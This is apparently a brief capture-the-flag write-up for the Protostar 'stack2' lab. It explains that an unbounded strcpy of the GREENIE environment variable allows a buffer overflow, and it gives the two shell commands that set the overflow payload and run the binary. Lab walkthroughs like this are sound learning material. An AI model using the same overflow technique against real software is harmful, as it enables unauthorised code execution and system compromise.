**Stack2**

This program strcpys the value of GREENIE into buffer with no limit, a buffer overflow will do the trick
```diff
$ export GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'")
$ /opt/protostar/bin/stack2
```